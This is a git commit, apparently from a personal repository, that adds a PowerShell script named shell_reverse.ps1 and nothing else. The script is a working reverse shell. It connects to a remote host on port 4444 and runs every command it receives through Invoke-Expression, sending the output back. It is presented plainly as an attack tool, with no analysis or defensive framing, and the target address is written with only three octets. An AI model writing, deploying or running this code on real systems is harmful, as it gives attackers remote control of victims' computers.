ef4fa7da18a8076265122bc3bc0338d9865a4166
roleyder <roleyder02@gmail.com>
2020-12-07 05:03:34 -0800

    shell reverse

---
+++ shell_reverse.ps1
@@ -0,0 +1,25 @@
+
+# Socket Connection
+$client = New-Object System.Net.Sockets.TCPCLient("10.0.23", 4444);
+$stream = $client.GetStream();
+
+
+# Send shell Prompt
+
+$get = "PS" + (pwd).Path + ">"
+$sendbyte = ([text.encoding]::ASCII).GetBytes($get)
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()
+[byte[]]$bytes = 0..255|%{0};
+
+# Wait for response, execute whatever's coming, then loop back
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String);
+    $sendback2 = $sendback + "PS" + (pwd).Path + ">";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
